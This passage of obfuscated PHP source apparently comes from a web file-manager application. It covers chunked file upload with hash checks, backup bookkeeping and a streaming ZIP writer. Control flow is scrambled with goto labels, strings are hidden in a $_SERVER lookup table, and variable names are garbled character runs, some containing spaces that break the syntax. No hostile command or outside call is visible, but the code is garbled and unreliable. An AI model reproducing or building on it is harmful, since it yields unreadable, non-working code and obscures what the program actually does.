strlen("\x7b\x69\x6f\x3a{$c²·ÔÚŸš‡[$_SERVER[…Ò×–][748]]}\175")); goto D§›Ï…ì¿Ş; f‹–é¾âĞ‚: if ($FÑÕİ»ã¢ >= 1024 * 1024 * 100) { $E¥ÂË…Ïõˆ = array($_SERVER[…Ò×–][752] => $c§Ï˜ƒ‰Ëš, $_SERVER[…Ò×–][753] => $eÇ‹••Õ©†, $_SERVER[…Ò×–][754] => $déàŠ‡Œ£Æ); Backup::set($E¥ÂË…Ïõˆ); $FÑÕİ»ã¢ = $FØ§šÏ÷ÄŠ = 0; } goto eƒí¾Ê„—Á; bÒŠ¿ôèá‚: $FÑÕİ»ã¢ += $c²·ÔÚŸš‡[$_SERVER[…Ò×–][77]]; $eÇ‹••Õ©† += 1; $déàŠ‡Œ£Æ += $c²·ÔÚŸš‡[$_SERVER[…Ò×–][77]]; goto f‹–é¾âĞ‚; eƒí¾Ê„—Á: } $BÄôï’“‰Ë = count($CáíÕØ± É); $AË¢–…÷µ++; } while ($BÄôï’“‰Ë == $bŠ´õêéáŸ); $b‡Ë…À·Ù->end(); goto D§Å×—“Üâ; F˜Ş÷ƒˆ–¯: $BµğíøÌÏ = !0; $A°ƒëøÙ’å = $this->storeIds(); $AË¢–…÷µ = 1; goto f­©Ï…ñƒ‘; D§Å×—“Üâ: $cŠËº¦ãœ± = $BµğíøÌÏ ? 1 : 0; $E¥ÂË…Ïõˆ = array($_SERVER[…Ò×–][755] => 1, $_SERVER[…Ò×–][452] => time(), $_SERVER[…Ò×–][713] => $cŠËº¦ãœ±, $_SERVER[…Ò×–][752] => $c§Ï˜ƒ‰Ëš, $_SERVER[…Ò×–][744] => $eÑ¼«ˆîê, $_SERVER[…Ò×–][743] => $e¡ã¾‘·Îæ); if ($FØ§šÏ÷ÄŠ) { $E¥ÂË…Ïõˆ[$_SERVER[…Ò×–][753]] = $eÇ‹••Õ©†; $E¥ÂË…Ïõˆ[$_SERVER[…Ò×–][754]] = $déàŠ‡Œ£Æ; } goto f‰Š ‘ŠÃ©; C¿æ ó¿¹Ë: } private function _fileExist($cÖÕè¦ÓÒ±, &$E»µÏê‰Î, $e¢¿ÚŸìÔ¢) { goto b±ÈÜ²½ÚÁ; B¬óªâ¯ê : $E»µÏê‰Î = array_merge($E»µÏê‰Î, array_to_keyvalue($F¥æ±µÙ„Ò, $CÓ¨‚˜ì£¿[33], $CÓ¨‚˜ì£¿[423])); return !1; goto cŒªñÈÔˆ­; b±ÈÜ²½ÚÁ: $CÓ¨‚˜ì£¿ =& $_SERVER[…Ò×–]; $aºÆ¢«¥Ö = $cÖÕè¦ÓÒ±[$CÓ¨‚˜ì£¿[75]]; if (in_array($cÖÕè¦ÓÒ±[$CÓ¨‚˜ì£¿[423]], $E»µÏê‰Î)) { return !1; } goto D£¸²É”; a»ğÊ¬¢ÌØ: if (IO::exist($f«ÓÄòìŸ)) { $E»µÏê‰Î[] = $cÖÕè¦ÓÒ±[$CÓ¨‚˜ì£¿[423]]; return !1; } $F¯÷•«Ë§ = array($CÓ¨‚˜ì£¿[748] => $cÖÕè¦ÓÒ±[$CÓ¨‚˜ì£¿[748]], $CÓ¨‚˜ì£¿[75] => array($CÓ¨‚˜ì£¿[756], "{$f«ÓÄòìŸ}\x25")); $F¥æ±µÙ„Ò = Model($CÓ¨‚˜ì£¿[723])->where($F¯÷•«Ë§)->field($CÓ¨‚˜ì£¿[424])->select(); goto B¬óªâ¯ê ; D£¸²É”: if (!in_array($cÖÕè¦ÓÒ±[$CÓ¨‚˜ì£¿[748]], $e¢¿ÚŸìÔ¢)) { return !1; } if (IO::exist($aºÆ¢«¥Ö)) { return !0; } $f«ÓÄòìŸ = get_path_father($aºÆ¢«¥Ö); goto a»ğÊ¬¢ÌØ; cŒªñÈÔˆ­: } private function _fileFilter($FŞíí„å»Ö) { $e‹ãÔ´ïÆ— =& $_SERVER[…Ò×–]; if (empty($FŞíí„å»Ö)) { return; } $BØ”©½™ Š = array($e‹ãÔ´ïÆ—[423] => array($e‹ãÔ´ïÆ—[7], array_unique($FŞíí„å»Ö))); $EØ‘¯´ƒé = Model($e‹ãÔ´ïÆ—[757])->where($BØ”©½™ Š)->field($e‹ãÔ´ïÆ—[373])->select(); foreach ($EØ‘¯´ƒé as $E”Ü–Êˆ¢‘) { Model($e‹ãÔ´ïÆ—[757])->remove($E”Ü–Êˆ¢‘[$e‹ãÔ´ïÆ—[373]], !1); } } private function storeIds() { $cñˆÏƒìã‹ =& $_SERVER[…Ò×–]; $d©–Ü‚‡Îâ = Model($cñˆÏƒìã‹[708])->listData(); $dÁà”éä£ = array(); $A°ßéäêÁá = $GLOBALS[$cñˆÏƒìã‹[6]][$cñˆÏƒìã‹[84]][$cñˆÏƒìã‹[758]]; foreach ($d©–Ü‚‡Îâ as $B±Šƒ¼‚Ø¥) { $a‰ŒÏ¬ªÔ« = strtolower($B±Šƒ¼‚Ø¥[$cñˆÏƒìã‹[90]]); if (!isset($A°ßéäêÁá[$a‰ŒÏ¬ªÔ«])) { continue; } $AêŠÖ²ƒ™õ = $cñˆÏƒìã‹[71] . (isset($A°ßéäêÁá[$a‰ŒÏ¬ªÔ«]) ? $A°ßéäêÁá[$a‰ŒÏ¬ªÔ«] : ucfirst($a‰ŒÏ¬ªÔ«)); if (!class_exists($AêŠÖ²ƒ™õ)) { continue; } $dÁà”éä£[] = $B±Šƒ¼‚Ø¥[$cñˆÏƒìã‹[371]]; } return $dÁà”éä£; } } goto Bö˜Šå©±¬; eò…›¿µ: if (class_exists($_SERVER[…Ò×–][1980])) { class Services_JSON_Error extends PEAR_Error { function __construct($DÕÏÓÓ×§ = "\165\156\x6b\x6e\x6f\167\x6e\40\x65\x72\162\157\162", $BËĞÍÅŞ¼¦ = null, $a…ãÜå¾ËÁ = null, $a™‰ŸÜŞ”Ó = null, $d¬Á¤½Œ‹ = null) { parent::PEAR_Error($DÕÏÓÓ×§, $BËĞÍÅŞ¼¦, $a…ãÜå¾ËÁ, $a™‰ŸÜŞ”Ó, $d¬Á¤½Œ‹); } } } else { class Services_JSON_Error { function __construct($Dãå¦¢“Œª = "\165\x6e\153\156\157\167\x6e\x20\x65\162\162\157\162", $B¿ç×ˆá¡É = null, $cÁŞ´ßùÇ = null, $E‘ŠšŠ‰¸ = null, $B¤ìÊ§—ô˜ = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto AùèíĞæß­; a±óÛß„ö: $this->checkSize(); $this->tempPathInit(); goto eŞ‹ƒØ±†©; E Óª¨Ÿ†À: if (!empty($_FILES)) { $A¨Ù¿º¼™º = $_FILES[$e êİÈ½Îø[171]]; $this->uploadFile = $A¨Ù¿º¼™º[$e êİÈ½Îø[1981]]; if (!$this->uploadFile && $A¨Ù¿º¼™º[$e êİÈ½Îø[1231]] > 0) { show_json($this->errorInfo($A¨Ù¿º¼™º[$e êİÈ½Îø[1231]]), !1); } } else { if (isset($in[$e êİÈ½Îø[390]])) { $this->uploadFile = isset($in[$e êİÈ½Îø[1982]]) ? $e êİÈ½Îø[1983] : $e êİÈ½Îø[1826]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto a±óÛß„ö; AùèíĞæß­: $e êİÈ½Îø =& $_SERVER[…Ò×–]; global $in; $this->in =& $in; goto E Óª¨Ÿ†À; eŞ‹ƒØ±†©: } public function upload() { goto D¾Ğ†âğ‹„; A„ø‚×É¨Æ: CacheLock::unlock($this->tempFile); return $this->tempFile; goto a™…®Ü–©Í; b±’Â±¬òÚ: $c»‘Ä‹Ò = $Fî®ñ‘‘¡‹ * $cÍÁ¿ˆ§ôà; $bº±³¦–èù = @fopen($this->tempFile, $Fİ¾¥Äİ’İ[1991]); fseek_64($bº±³¦–èù, $c»‘Ä‹Ò); goto CİÁÇº…íÍ; a‡ó±±ù‡…: $aÍÌ†ª›Õ‹[$Fİ¾¥Äİ’İ[1994]][$Fİ¾¥Äİ’İ[1995] . $Fî®ñ‘‘¡‹] = array($Fİ¾¥Äİ’İ[1996] => $c»‘Ä‹Ò, $Fİ¾¥Äİ’İ[1047] => $Fî®ñ‘‘¡‹, $Fİ¾¥Äİ’İ[77] => $e—öŠ¨ùÊ°, $Fİ¾¥Äİ’İ[168] => $CÃ½Ë£šÌğ); $this->statusSet($aÍÌ†ª›Õ‹); if (count($aÍÌ†ª›Õ‹[$Fİ¾¥Äİ’İ[1994]]) != $aÍÌ†ª›Õ‹[$Fİ¾¥Äİ’İ[1993]]) { $this->showJson($Fİ¾¥Äİ’İ[1997] . $Fî®ñ‘‘¡‹, !0); } goto dŸĞâÔö¾; E³Æè¼á„Ş: @unlink($aâÎÈŠ³´Å); if (!$aÎğå¹ù÷) { $this->showJson($Fİ¾¥Äİ’İ[1992] . $Fî®ñ‘‘¡‹, !1); } $aÍÌ†ª›Õ‹[$Fİ¾¥Äİ’İ[1993]] = $e¼ê‹¾ÈÍ£; goto a‡ó±±ù‡…; Bì†äîŒçÒ: if ($e¼ê‹¾ÈÍ£ > 1 && $cÍÁ¿ˆ§ôà <= 0) { show_json($Fİ¾¥Äİ’İ[1988], !1); } if ($cÍÁ¿ˆ§ôà > $e—öŠ¨ùÊ°) { $e¼ê‹¾ÈÍ£ = 1; } if ($e¼ê‹¾ÈÍ£ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto CÃ°İ½¢ğù; D¾Ğ†âğ‹„: $Fİ¾¥Äİ’İ =& $_SERVER[…Ò×–]; $Fî®ñ‘‘¡‹ = isset($this->in[$Fİ¾¥Äİ’İ[1984]]) ? intval($this->in[$Fİ¾¥Äİ’İ[1984]]) : 0; $e¼ê‹¾ÈÍ£ = isset($this->in[$Fİ¾¥Äİ’İ[1985]]) ? intval($this->in[$Fİ¾¥Äİ’İ[1985]]) : 1; goto CÏñÆµ¡ÆĞ; EöãÑî»¨: $aâÎÈŠ³´Å = $this->moveUploadedFile($A˜¦…Šè£è); if ($e—öŠ¨ùÊ° > 0 && filesize($aâÎÈŠ³´Å) == 0) { $this->showJson($Fİ¾¥Äİ’İ[1989], !1); } if (!$aâÎÈŠ³´Å) { $this->showJson(LNG($Fİ¾¥Äİ’İ[1990]), !1); } goto b±’Â±¬òÚ; dŸĞâÔö¾: ignore_timeout(); if (!$this->checkChunkHash($aÍÌ†ª›Õ‹)) { $this->showJson($Fİ¾¥Äİ’İ[1998], !1); } $this->statusSet(!1); goto A„ø‚×É¨Æ; CÏñÆµ¡ÆĞ: $A˜¦…Šè£è = $this->tempFile . $Fİ¾¥Äİ’İ[1986] . $Fî®ñ‘‘¡‹; $e—öŠ¨ùÊ° = isset($this->in[$Fİ¾¥Äİ’İ[525]]) ? intval($this->in[$Fİ¾¥Äİ’İ[525]]) : 0; $cÍÁ¿ˆ§ôà = isset($this->in[$Fİ¾¥Äİ’İ[1987]]) ? intval($this->in[$Fİ¾¥Äİ’İ[1987]]) : 0; goto Bì†äîŒçÒ; CÃ°İ½¢ğù: CacheLock::lock($this->tempFile, 20); $aÍÌ†ª›Õ‹ = $this->statusGet(); $this->initFileTemp(); goto EöãÑî»¨; CİÁÇº…íÍ: $aÎğå¹ù÷ = $this->writeTo($aâÎÈŠ³´Å, $bº±³¦–èù, $this->tempFile); $CÃ½Ë£šÌğ = IO::hashSimple($aâÎÈŠ³´Å); $e—öŠ¨ùÊ° = IO::size($aâÎÈŠ³´Å); goto E³Æè¼á„Ş; a™…®Ü–©Í: } private function checkSize() { $d†‚äÈ¡øÒ =& $_SERVER[…Ò×–]; if (phpBuild64() || $this->in[$d†‚äÈ¡øÒ[77]] < PHP_INT_MAX) { return; } show_json(LNG($d†‚äÈ¡øÒ[1999]), !1); } private function showJson($bõ–Ø¡‡˜¶, $bˆ×Ñš†¼Š) { CacheLock::unlock($this->tempFile); if (!$bˆ×Ñš†¼Š) { return show_json($bõ–Ø¡‡˜¶, $bˆ×Ñš†¼Š); } show_json($bõ–Ø¡‡˜¶, $bˆ×Ñš†¼Š); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto a´Ïãå±; dŸàùßç­Ñ: touch($b¹Ó•›Ï¸ . $EÜÛŠ«ø¦ğ[2000]); $EÖª¾º”µ³ = isset($this->in[$EÜÛŠ«ø¦ğ[2001]]) ? $this->in[$EÜÛŠ«ø¦ğ[2001]] : !1; if (strlen($EÖª¾º”µ³) < 30) { $EÖª¾º”µ³ = md5(USER_ID . $this->in[$EÜÛŠ«ø¦ğ[75]] . $this->fileName . $this->in[$EÜÛŠ«ø¦ğ[77]]); } goto FªšŸœïŸ…; a´Ïãå±: $EÜÛŠ«ø¦ğ =& $_SERVER[…Ò×–]; $b¹Ó•›Ï¸ = TEMP_FILES; @mk_dir($b¹Ó•›Ï¸); goto dŸàùßç­Ñ; FªšŸœïŸ…: $this->tempFile = $b¹Ó•›Ï¸ . $EÜÛŠ«ø¦ğ[2002] . md5($EÖª¾º”µ³ . $this->in[$EÜÛŠ«ø¦ğ[1545]]); goto CÄ”‘‚¦Ö™; CÄ”‘‚¦Ö™: } private function moveUploadedFile($BãˆÆ­—‚) { $D£ÓÒ–› =& $_SERVER[…Ò×–]; $AÇ¨ôÃª® = $this->uploadFile; if ($AÇ¨ôÃª® == $D£ÓÒ–›[2003]) { @file_put_contents($BãˆÆ­—‚, base64_decode($_REQUEST[$D£ÓÒ–›[2004]])); } else { if ($AÇ¨ôÃª® == $D£ÓÒ–›[1826]) { $C¦†‰Í¥¹Ä = @fopen($BãˆÆ­—‚, $D£ÓÒ–›[1535]); $this->writeTo($AÇ¨ôÃª®, $C¦†‰Í¥¹Ä, $BãˆÆ­—‚); } else { if (!move_uploaded_file($AÇ¨ôÃª®, $BãˆÆ­—‚)) { return !1; } } } return $BãˆÆ­—‚; } private function writeTo($CÉŞ»óÛ†°, $C”ç­¹éé, $CµËÒƒœ¾) { goto CƒİÆÃø; CƒİÆÃø: $cŠÌ×ùƒƒ‹ =& $_SERVER[…Ò×–]; $dšˆÅ†¿äé = $cŠÌ×ùƒƒ‹[2005] . $CµËÒƒœ¾; $Eá¤²´Ş‚ = CacheLock::lock($dšˆÅ†¿äé, 1); goto Fƒ±¥˜ ÇĞ; Fƒ±¥˜ ÇĞ: $BˆõßàÇÓƒ = @fopen($CÉŞ»óÛ†°, $cŠÌ×ùƒƒ‹[1534]); if (!$BˆõßàÇÓƒ || !$C”ç­¹éé || !$Eá¤²´Ş‚) { CacheLock::unlock($dšˆÅ†¿äé); return !1; } while (!feof($BˆõßàÇÓƒ)) { fwrite($C”ç­¹éé, fread($BˆõßàÇÓƒ, 1024 * 200)); } goto dŠ‘ŒÑ³´; E¸’·ÍŞö: return !0; goto FçÜ“õ‡Û; dŠ‘ŒÑ³´: fclose($BˆõßàÇÓƒ); fclose($C”ç­¹éé); CacheLock::unlock($dšˆÅ†¿äé); goto E¸’·ÍŞö; FçÜ“õ‡Û: } private function statusGet() { goto Aˆ“†Õ­¹Í; Aˆ“†Õ­¹Í: $e¨…¾á©È =& $_SERVER[…Ò×–]; if (is_array($this->statusData)) { return $this->statusData; } $F…Äˆ¤‹ = $this->tempFile . $e¨…¾á©È[2006]; goto bÀøŠĞŞ¿‹; AÛ’’ƒ ù™: if (!$this->statusData) { $d˜ŸÎºö„÷ = array($e¨…¾á©È[28] => $this->fileName, $e¨…¾á©È[1993] => 0, $e¨…¾á©È[1994] => array()); $this->statusSet($d˜ŸÎºö„÷); } return $this->statusData; goto eç•Ùñ´—¬; bÀøŠĞŞ¿‹: $DìµçßÅ‘ = !1; if (file_exists($F…Äˆ¤‹)) { $DìµçßÅ‘ = @file_get_contents($F…Äˆ¤‹); } if ($DìµçßÅ‘) { $this->statusData = json_decode($DìµçßÅ‘, !0); } goto AÛ’’ƒ ù™; eç•Ùñ´—¬: } public function statusSet($CŞÅ„âÓ£Ó) { $bë×È¡èä = $this->tempFile . $_SERVER[…Ò×–][2006]; if (!$CŞÅ„âÓ£Ó) { if (file_exists($bë×È¡èä)) { @unlink($bë×È¡èä); } return !0; } $this->statusData = $CŞÅ„âÓ£Ó; return file_put_contents($bë×È¡èä, json_encode($CŞÅ„âÓ£Ó)); } private function initFileTemp() { $B³à¼„¥Ò‘ =& $_SERVER[…Ò×–]; if (file_exists($this->tempFile)) { return; } $dø‚ «¾† = fopen($this->tempFile, $B³à¼„¥Ò‘[2007]); fseek_64($dø‚ «¾†, $this->in[$B³à¼„¥Ò‘[77]] - 1, SEEK_SET); fwrite($dø‚ «¾†, $B³à¼„¥Ò‘[473]); fclose($dø‚ «¾†); } public function checkChunk() { goto cÑ¾§ÈÄá²; f‡†Ò®£¬”: $AˆõĞããõŞ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($AˆõĞããõŞ[$Få”´Ñ¬Ò®[1994]] as $CÓµ¿¹›°¾) { $fÆ¯‡™»¢ = $CÓµ¿¹›°¾[$Få”´Ñ¬Ò®[168]]; if ($fÆ¯‡™»¢) { $FÛ¤íš«[$Få”´Ñ¬Ò®[2008] . $CÓµ¿¹›°¾[$Få”´Ñ¬Ò®[1047]]] = $fÆ¯‡™»¢; } } goto E¥ÂƒÑ×¤; E¥ÂƒÑ×¤: return $FÛ¤íš«; goto AÀÜ“¦¢ëß; cÑ¾§ÈÄá²: $Få”´Ñ¬Ò® =& $_SERVER[…Ò×–]; $FÛ¤íš« = array(); CacheLock::lock($this->tempFile); goto f‡†Ò®£¬”; AÀÜ“¦¢ëß: } private function checkChunkHash($cÄ´õ˜ì‹) { goto díÈŞæœ¹­; bòìÃàÑ: return $cå¬¦”ÕÂ¾; goto eŒê±¹Ó¡¸; eÅÄ–°æ‰Ò: $cå¬¦”ÕÂ¾ = !0; foreach ($cÄ´õ˜ì‹[$BÊŸ‚–œª[1994]] as $F¹±¬Ú×¡•) { fseek_64($cìŠÀ¯ŠØ¢, $F¹±¬Ú×¡•[$BÊŸ‚–œª[1996]]); $cƒ¤‘ØçÂÚ = PathDriverStream::hash($cìŠÀ¯ŠØ¢, $F¹±¬Ú×¡•[$BÊŸ‚–œª[77]]); if ($F¹±¬Ú×¡•[$BÊŸ‚–œª[168]] != $cƒ¤‘ØçÂÚ) { $cå¬¦”ÕÂ¾ = !1; break; } } fclose($cìŠÀ¯ŠØ¢); goto bòìÃàÑ; díÈŞæœ¹­: $BÊŸ‚–œª =& $_SERVER[…Ò×–]; if (count($cÄ´õ˜ì‹[$BÊŸ‚–œª[1994]]) != $cÄ´õ˜ì‹[$BÊŸ‚–œª[1993]]) { return !1; } $e˜÷’„òæ = _get($this->in, $BÊŸ‚–œª[2001]); goto f‚‡Í“îõà; f‚‡Í“îõà: $DâŠº—«¸„ = _get($this->in, $BÊŸ‚–œª[2009]); if (strlen($DâŠº—«¸„) == 32 && IO::hashSimple($this->tempFile) == $e˜÷’„òæ && IO::hashMd5($this->tempFile) == $DâŠº—«¸„) { return !0; } $cìŠÀ¯ŠØ¢ = fopen($this->tempFile, $BÊŸ‚–œª[1182]); goto eÅÄ–°æ‰Ò; eŒê±¹Ó¡¸: } public static function fileName() { goto D®ÅÏ ®•ª; eÍÃñê»‰: $EœÁ¦³Ö—Í = $EœÁ¦³Ö—Í ? $EœÁ¦³Ö—Í : time(); $Eª…–÷šÛ¸ = strtolower($f÷Şåô‡); if ($Eª…–÷šÛ¸ == $dù£‹½ğÆ¬[2011] || $Eª…–÷šÛ¸ == $dù£‹½ğÆ¬[2012]) { $f÷Şåô‡ = date($dù£‹½ğÆ¬[695], $EœÁ¦³Ö—Í) . $dù£‹½ğÆ¬[70] . $in[$dù£‹½ğÆ¬[77]] . $dù£‹½ğÆ¬[1640]; } else { if ($Eª…–÷šÛ¸ == $dù£‹½ğÆ¬[2013]) { $f÷Şåô‡ = date($dù£‹½ğÆ¬[695], $EœÁ¦³Ö—Í) . $dù£‹½ğÆ¬[70] . $in[$dù£‹½ğÆ¬[77]] . $dù£‹½ğÆ¬[2014]; } } goto C©›œ¿ì ; C©›œ¿ì : return KodIO::clear($f÷Şåô‡); goto A¶çŞÄƒ‹¥; fÇ½¤÷ÛèŞ: if (!empty($_FILES)) { $f÷Şåô‡ = $f÷Şåô‡ ? $f÷Şåô‡ : $_FILES[$dù£‹½ğÆ¬[171]][$dù£‹½ğÆ¬[390]]; } if (!is_wap()) { return KodIO::clear($f÷Şåô‡); } $EœÁ¦³Ö—Í = strtotime($in[$dù£‹½ğÆ¬[2010]]); goto eÍÃñê»‰; D®ÅÏ ®•ª: $dù£‹½ğÆ¬ =& $_SERVER[…Ò×–]; global $in; $f÷Şåô‡ = isset($in[$dù£‹½ğÆ¬[28]]) ? $in[$dù£‹½ğÆ¬[28]] : $dù£‹½ğÆ¬[33]; goto fÇ½¤÷ÛèŞ; A¶çŞÄƒ‹¥: } private function errorInfo($AöÉ³¹¢ï») { $F³ğÔİÔ§ò =& $_SERVER[…Ò×–]; $Bô¼¥‹ã = array($F³ğÔİÔ§ò[2015], $F³ğÔİÔ§ò[2016], $F³ğÔİÔ§ò[2017], $F³ğÔİÔ§ò[2018], $F³ğÔİÔ§ò[2019], $F³ğÔİÔ§ò[2020], $F³ğÔİÔ§ò[2021], $F³ğÔİÔ§ò[2022]); return $AöÉ³¹¢ï» . $F³ğÔİÔ§ò[4] . $Bô¼¥‹ã[$AöÉ³¹¢ï»]; } } class ZipMake { const VERSION = "\x30\56\x32\56\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($a¥Š±Úø•è = null) { $aò‡»ÎçÍ =& $_SERVER[…Ò×–]; $this->outputStream = fopen($aò‡»ÎçÍ[2023], $aò‡»ÎçÍ[1238]); $this->outputName = $a¥Š±Úø•è; $this->needHeaders = !0; } public function addFile($Fß„êçº­, $fòÑÁÃ¸¼) { goto fŠñ©Ø˜‘Ö; dåˆ„Ñª²: $CÈÍÚ›ğª = $this->addFileHeader($Fß„êçº­, $bÜ£ñº‚¿®); $EùİÑ¢Á³ª = $B·ÂÒÀÌ®Û = filesize_64($fòÑÁÃ¸¼); $f¶ÖÏ¨÷óù = fopen($fòÑÁÃ¸¼, $E®¡ŞÇ¨±â[2024]); goto Fñ´ì…Õ¸¢; fŠñ©Ø˜‘Ö: $E®¡ŞÇ¨±â =& $_SERVER[…Ò×–]; $Fß„êçº­ = $this->filterFilename($Fß„êçº­); $bÜ£ñº‚¿® = static::METHOD_STORE; goto dåˆ„Ñª²; CËâÃÑ¿†š: $this->addFileFooter($Fß„êçº­, $bÜ£ñº‚¿®, $FæÁÂÎ¶ö, $EùİÑ¢Á³ª, $B·ÂÒÀÌ®Û, $CÈÍÚ›ğª); goto AøÒ”‡®ÛŸ; Fñ´ì…Õ¸¢: while (!feof($f¶ÖÏ¨÷óù)) { $d¼ä³³Õøå = fread($f¶ÖÏ¨÷óù, 1048576); $this->send($d¼ä³³Õøå); } fclose($f¶ÖÏ¨÷óù); $FæÁÂÎ¶ö = hexdec(hash_file($E®¡ŞÇ¨±â[2025], $fòÑÁÃ¸¼)); goto CËâÃÑ¿†š; AøÒ”‡®ÛŸ: } public function addFileFromStream($DÄóŸùîŸ, $B•å•¾ë×¹) { goto fçŒô¨Áã³; fçŒô¨Áã³: $DÄóŸùîŸ = $this->filterFilename($DÄóŸùîŸ); $aÑò ¢¹¶¬ = static::METHOD_STORE; $cÀìœœó† = $this->addFileHeader($DÄóŸùîŸ, $aÑò ¢¹¶¬); goto eŸå¬×êÌÏ; aÔÈšÇ¢‰‡: $this->addFileFooter($DÄóŸùîŸ, $aÑò ¢¹¶¬, $AöÅà›”±Õ, $eŠÃåõŸè, $B È®ô‡ãâ, $cÀìœœó†); goto EËæÚ·ÁÀ; Fº†ôİó…: $dÁ—Û§ñ‡Á = hash_init($_SERVER[…Ò×–][2025]); while (!feof($B•å•¾ë×¹)) { $A“’³¿“Šô = fread($B•å•¾ë×¹, 1048576); hash_update($dÁ—Û§ñ‡Á, $A“’³¿“Šô); $this->send($A“’³¿“Šô); } $AöÅà›”±Õ = hexdec(hash_final($dÁ—Û§ñ‡Á)); goto aÔÈšÇ¢‰‡; eŸå¬×êÌÏ: fseek($B•å•¾ë×¹, 0, SEEK_END); $eŠÃåõŸè = $B È®ô‡ãâ = ftell($B•å•¾ë×¹); rewind($B•å•¾ë×¹); goto Fº†ôİó…; EËæÚ·ÁÀ: } public function finish() { foreach ($this->files as $EŞ«Ç‚¬³) { $this->addCdrFile($EŞ«Ç‚¬³); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($FÄù¼‰‹Âî, $BÊƒ˜ª·‚²) { goto bèÎ‹õ‘¸İ; f±¯“’áã¼: $e„ÍÈÕÀøÜ = $this->packFields($e»Üæï®àï); $C±Õ§ôÜ½Ã = $this->packFields($eø˜Úëá¿); $this->send($e„ÍÈÕÀøÜ . $FÄù¼‰‹Âî . $C±Õ§ôÜ½Ã); goto dßÎäè¯‚; dßÎäè¯‚: return strlen($e„ÍÈÕÀøÜ) + $Cò®¤İ÷ê + strlen($C±Õ§ôÜ½Ã); goto EÆİÕÜèÇ; bèÎ‹õ‘¸İ: $F†·êƒñ =& $_SERVER[…Ò×–]; $FÄù¼‰‹Âî = preg_replace($F†·êƒñ[2026], $F†·êƒñ[33], $FÄù¼‰‹Âî); $Cò®¤İ÷ê = strlen($FÄù¼‰‹Âî); goto c÷«™Æå¶; c÷«™Æå¶: $cÌ øËÓëØ = $this->dosTime(time()); $e»Üæï®àï = array(array($F†·êƒñ[2027], static::FILE_HEADER_SIGNATURE), array($F†·êƒñ[2028], static::ZIP_VERSION_64), array($F†·êƒñ[2028], 8), array($F†·êƒñ[2028], $BÊƒ˜ª·‚²), array($F†·êƒñ[2027], $cÌ øËÓëØ), array($F†·êƒñ[2027], 0), array($F†·êƒñ[2027], 4294967295), array($F†·êƒñ[2027], 4294967295), array($F†·êƒñ[2028], $Cò®¤İ÷ê), array($F†·êƒñ[2028], 32)); $eø˜Úëá¿ = array(array($F†·êƒñ[2028], 1), array($F†·êƒñ[2028], 28), array($F†·êƒñ[2029], 0), array($F†·êƒñ[2029], 0), array($F†·êƒñ[2029], 0), array($F†·êƒñ[2027], 0)); goto f±¯“’áã¼; EÆİÕÜèÇ: } protected function addFileFooter($c¹¸íÔá¾à, $EŒš©Ô°‚ô, $DÂ¬î®¬¿½, $eÑ‰â‚†­Ë, $BÎö¼­‘Æ˜, $EÁŠªª„¸†) { $a÷¬ÄÚÆï‡ =& $_SERVER[…Ò×–]; $EÇ×‘åŠ²± = array(array($a÷¬ÄÚÆï‡[2027], static::DATA_DESCRIPTOR_SIGNATURE), array($a÷¬ÄÚÆï‡[2027], $DÂ¬î®¬¿½), array($a÷¬ÄÚÆï‡[2029], $eÑ‰â‚†­Ë), array($a÷¬ÄÚÆï‡[2029], $BÎö¼­‘Æ˜)); $dÎ•‘¢÷¦¶ = $this->packFields($EÇ×‘åŠ²±); $this->send($dÎ•‘¢÷¦¶); $f²ÅœÒ¡¼ = $EÁŠªª„¸† + $eÑ‰â‚†­Ë + $aá”ĞùÍ†¢; $this->addToCdr($c¹¸íÔá¾à, $EŒš©Ô°‚ô, $DÂ¬î®¬¿½, $eÑ‰â‚†­Ë, $BÎö¼­‘Æ˜, $f²ÅœÒ¡¼); } private function addToCdr($dµ´¡åÂªá, $FÔ¢Øæï¬, $DùÑ¡æÚŒ, $c©›èƒğíÙ, $f¤ÇİÃ«àŸ, $Eôöó½‘ŠÖ) { $this->files[] = array($dµ´¡åÂªá, $FÔ¢Øæï¬, $DùÑ¡æÚŒ, $c©›èƒğíÙ, $f¤ÇİÃ«àŸ, $this->ofs); $this->ofs += $Eôöó½‘ŠÖ; } protected function addCdrFile($AË‚ªªœ†Ø) { goto f”ËÅÍè; B“ğÓãŸ¦±: $bÈÕÖ¥ÕßÛ = $this->packFields($aÌˆ¸²ËÆº); $Aœ—¬ï›”« = $this->packFields($DÀ‹­ñ‰â‰); $c¸Ã±î ¬ô = $bÈÕÖ¥ÕßÛ . $b £´—éÏÙ . $d†Êæ¬Î«ª . $Aœ—¬ï›”«; goto E†»šˆë†¶; f”ËÅÍè: $cÍâÆÒğÔ· =& $_SERVER[…Ò×–]; list($b £´—éÏÙ, $EÅÂ–»Œ“, $aÙÖÚê‡Ğ§, $DŠÃ¿ø’÷‹, $eƒ¬¥Õ•šõ, $eã’áÔ®ô) = $AË‚ªªœ†Ø; $d†Êæ¬Î«ª = $cÍâÆÒğÔ·[33]; goto C¡ø†£Ë¦Ü; E†»šˆë†¶: $this->send($c¸Ã±î ¬ô); $this->cdr_ofs += strlen($c¸Ã±î ¬ô); goto dğë³Ùº; C¡ø†£Ë¦Ü: $E™¡‡÷š†× = $this->dosTime(time()); $aÌˆ¸²ËÆº = array(array($cÍâÆÒğÔ·[2027], static::CDR_FILE_SIGNATURE), array($cÍâÆÒğÔ·[2028], static::ZIP_VERSION_64), array($cÍâÆÒğÔ·[2028], static::ZIP_VERSION_64), array($cÍâÆÒğÔ·[2028], 8), array($cÍâÆÒğÔ·[2028], $EÅÂ–»Œ“), array($cÍâÆÒğÔ·[2027], $E™¡‡÷š†×), array($cÍâÆÒğÔ·[2027], $aÙÖÚê‡Ğ§), 